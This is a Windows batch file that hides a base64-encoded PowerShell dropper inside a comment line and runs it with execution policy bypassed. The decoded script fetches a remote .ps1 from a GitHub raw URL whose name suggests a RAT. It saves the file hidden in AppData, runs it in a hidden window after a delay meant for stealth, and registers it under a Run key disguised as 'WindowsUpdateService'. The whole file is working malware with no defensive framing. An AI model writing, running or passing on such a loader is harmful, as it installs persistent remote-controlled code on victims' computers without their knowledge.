@echo off
setlocal

powershell -exec bypass -C "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content '%~f0' -raw | Select-String (':' + ':KDOT::(.*)')).Matches.Groups[1].Value)))"

::KDOT::IyBRdWFudHVtRG93bmxvYWRlckluc3RhbGxlci5wczENCiMgU3RlYWx0aHkgUG93ZXJTaGVsbCBzY3JpcHQgdG8gZG93bmxvYWQsIGluc3RhbGwsIGFuZCBleGVjdXRlIGEgZmlsZSB3aXRoIHN0YXJ0dXAgcGVyc2lzdGVuY2UNCg0KIyBGdW5jdGlvbiB0byBnZW5lcmF0ZSBhIHJhbmRvbSBzdHJpbmcgZm9yIGZpbGVuYW1lcw0KZnVuY3Rpb24gR2V0LVJhbmRvbU5hbWUgew0KICAgIHBhcmFtIChbaW50XSRsZW5ndGgpDQogICAgJGNoYXJzID0gImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5Ii5Ub0NoYXJBcnJheSgpDQogICAgJHJhbmRvbSA9IE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbQ0KICAgICRyZXN1bHQgPSAtam9pbiAoMS4uJGxlbmd0aCB8IEZvckVhY2gtT2JqZWN0IHsgJGNoYXJzWyRyYW5kb20uTmV4dCgwLCAkY2hhcnMuTGVuZ3RoKV0gfSkNCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KDQojIEZ1bmN0aW9uIHRvIGxvZyBlcnJvcnMgdG8gYSBoaWRkZW4gZmlsZQ0KZnVuY3Rpb24gV3JpdGUtRXJyb3JMb2cgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kTWVzc2FnZSwNCiAgICAgICAgW3N0cmluZ10kTG9nRGlyDQogICAgKQ0KICAgIHRyeSB7DQogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJExvZ0RpcikpIHsNCiAgICAgICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJExvZ0RpciAtRm9yY2UgfCBPdXQtTnVsbA0KICAgICAgICAgICAgKEdldC1JdGVtICRMb2dEaXIpLkF0dHJpYnV0ZXMgPSAnSGlkZGVuLFN5c3RlbScNCiAgICAgICAgfQ0KICAgICAgICAkbG9nUGF0aCA9IEpvaW4tUGF0aCAkTG9nRGlyICJsb2cudHh0Ig0KICAgICAgICAkdGltZXN0YW1wID0gR2V0LURhdGUgLUZvcm1hdCAieXl5eS1NTS1kZCBISDptbTpzcyINCiAgICAgICAgQWRkLUNvbnRlbnQgLVBhdGggJGxvZ1BhdGggLVZhbHVlICIkdGltZXN0YW1wIDogJE1lc3NhZ2UiDQogICAgICAgIChHZXQtSXRlbSAkbG9nUGF0aCkuQXR0cmlidXRlcyA9ICdIaWRkZW4sU3lzdGVtJw0KICAgIH0gY2F0Y2ggew0KICAgICAgICAjIFNpbGVudCBlcnJvciBoYW5kbGluZw0KICAgIH0NCn0NCg0KdHJ5IHsNCiAgICAjIFN0ZXAgMTogRGVmaW5lIGNvbmZpZ3VyYXRpb24NCiAgICAkdXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9kaXZpbmVsb2wvcmNlaW5nc2tpdWRzL21haW4vcmF0cHVpbHQ5NDc2ZThkYjVkZjA0M2I3ODQ4YTBmOWU5NWIyY2YxYS5wczEiICMgUHJvdmlkZWQgVVJMDQogICAgJGluc3RhbGxEaXIgPSBKb2luLVBhdGggJGVudjpBUFBEQVRBICJNaWNyb3NvZnRcV2luZG93c1xDYWNoZSINCiAgICAkcmFuZG9tRmlsZU5hbWUgPSAoR2V0LVJhbmRvbU5hbWUgLWxlbmd0aCA4KSArICIucHMxIg0KICAgICRpbnN0YWxsUGF0aCA9IEpvaW4tUGF0aCAkaW5zdGFsbERpciAkcmFuZG9tRmlsZU5hbWUNCiAgICAkYXBwTmFtZSA9ICJXaW5kb3dzVXBkYXRlU2VydmljZSINCg0KICAgICMgU3RlcCAyOiBEb3dubG9hZCB0aGUgZmlsZSBzaWxlbnRseQ0KICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50DQogICAgJGNsaWVudC5IZWFkZXJzLkFkZCgiVXNlci1BZ2VudCIsICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSIpDQogICAgdHJ5IHsNCiAgICAgICAgJGZpbGVCeXRlcyA9ICRjbGllbnQuRG93bmxvYWREYXRhKCR1cmwpDQogICAgICAgIGlmICgtbm90ICRmaWxlQnl0ZXMgLW9yICRmaWxlQnl0ZXMuTGVuZ3RoIC1lcSAwKSB7DQogICAgICAgICAgICBXcml0ZS1FcnJvckxvZyAtTWVzc2FnZSAiRmFpbGVkIHRvIGRvd25sb2FkIGZpbGUgZnJvbSBVUkwuIiAtTG9nRGlyICRpbnN0YWxsRGlyDQogICAgICAgICAgICBleGl0DQogICAgICAgIH0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgV3JpdGUtRXJyb3JMb2cgLU1lc3NhZ2UgIkRvd25sb2FkIGVycm9yOiAkXyIgLUxvZ0RpciAkaW5zdGFsbERpcg0KICAgICAgICBleGl0DQogICAgfQ0KDQogICAgIyBTdGVwIDM6IENyZWF0ZSBpbnN0YWxsYXRpb24gZGlyZWN0b3J5DQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkaW5zdGFsbERpcikpIHsNCiAgICAgICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkaW5zdGFsbERpciAtRm9yY2UgfCBPdXQtTnVsbA0KICAgICAgICAoR2V0LUl0ZW0gJGluc3RhbGxEaXIpLkF0dHJpYnV0ZXMgPSAnSGlkZGVuLFN5c3RlbScNCiAgICB9DQoNCiAgICAjIFN0ZXAgNDogU2F2ZSB0aGUgZmlsZQ0KICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJGluc3RhbGxQYXRoLCAkZmlsZUJ5dGVzKQ0KICAgIChHZXQtSXRlbSAkaW5zdGFsbFBhdGgpLkF0dHJpYnV0ZXMgPSAnSGlkZGVuLFN5c3RlbScNCg0KICAgICMgU3RlcCA1OiBBZGQgcmFuZG9taXplZCBkZWxheSBmb3Igc3RlYWx0aA0KICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgKEdldC1SYW5kb20gLU1pbmltdW0gMTAwMCAtTWF4aW11bSAzMDAwKQ0KDQogICAgIyBTdGVwIDY6IFJ1biB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5DQogICAgdHJ5IHsNCiAgICAgICAgJHBzaSA9IE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NTdGFydEluZm8NCiAgICAgICAgJHBzaS5GaWxlTmFtZSA9ICJwb3dlcnNoZWxsLmV4ZSINCiAgICAgICAgJHBzaS5Bcmd1bWVudHMgPSAiLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRmlsZSBgIiRpbnN0YWxsUGF0aGAiIg0KICAgICAgICAkcHNpLlVzZVNoZWxsRXhlY3V0ZSA9ICRmYWxzZQ0KICAgICAgICAkcHNpLkNyZWF0ZU5vV2luZG93ID0gJHRydWUNCiAgICAgICAgJHBzaS5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gJHRydWUNCiAgICAgICAgJHBzaS5SZWRpcmVjdFN0YW5kYXJkRXJyb3IgPSAkdHJ1ZQ0KICAgICAgICAkcHJvY2VzcyA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc106OlN0YXJ0KCRwc2kpDQogICAgICAgICRlcnJvck91dHB1dCA9ICRwcm9jZXNzLlN0YW5kYXJkRXJyb3IuUmVhZFRvRW5kKCkNCiAgICAgICAgJHByb2Nlc3MuV2FpdEZvckV4aXQoKQ0KICAgICAgICBpZiAoJGVycm9yT3V0cHV0KSB7DQogICAgICAgICAgICBXcml0ZS1FcnJvckxvZyAtTWVzc2FnZSAiRXhlY3V0aW9uIGVycm9yOiAkZXJyb3JPdXRwdXQiIC1Mb2dEaXIgJGluc3RhbGxEaXINCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBXcml0ZS1FcnJvckxvZyAtTWVzc2FnZSAiRXhlY3V0aW9uIGVycm9yOiAkXyIgLUxvZ0RpciAkaW5zdGFsbERpcg0KICAgIH0NCg0KICAgICMgU3RlcCA3OiBBZGQgdG8gV2luZG93cyBzdGFydHVwIHZpYSBSZWdpc3RyeQ0KICAgIHRyeSB7DQogICAgICAgICRyZWdQYXRoID0gIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biINCiAgICAgICAgJGNvbW1hbmQgPSAicG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRmlsZSBgIiRpbnN0YWxsUGF0aGAiIg0KICAgICAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdQYXRoIC1OYW1lICRhcHBOYW1lIC1WYWx1ZSAkY29tbWFuZCAtRXJyb3JBY3Rpb24gU3RvcA0KICAgIH0gY2F0Y2ggew0KICAgICAgICBXcml0ZS1FcnJvckxvZyAtTWVzc2FnZSAiUmVnaXN0cnkgZXJyb3I6ICRfIiAtTG9nRGlyICRpbnN0YWxsRGlyDQogICAgICAgIGV4aXQNCiAgICB9DQp9IGNhdGNoIHsNCiAgICBXcml0ZS1FcnJvckxvZyAtTWVzc2FnZSAiR2VuZXJhbCBlcnJvcjogJF8iIC1Mb2dEaXIgKEpvaW4tUGF0aCAkZW52OkFQUERBVEEgIk1pY3Jvc29mdFxXaW5kb3dzXENhY2hlIikNCn0=

endlocal
exit /b
